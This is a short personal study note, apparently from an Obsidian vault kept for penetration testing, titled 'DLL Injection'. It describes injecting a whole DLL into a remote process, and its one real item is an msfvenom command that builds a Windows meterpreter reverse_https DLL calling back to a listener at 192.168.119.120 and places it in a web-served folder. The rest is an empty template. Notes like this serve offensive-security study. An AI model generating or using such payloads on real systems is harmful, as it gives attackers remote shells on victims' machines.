---
creation date: December 28th 2022
last modified date: December 28th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[DLL Injection]]  
___

## Description:  

For injecting an entire DLL into a remote process instead of just shellcode

Generate a DLL:
```
kali@kali:~$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f dll -o /var/www/html/met.dll
```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 28th 2022 (11:55 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
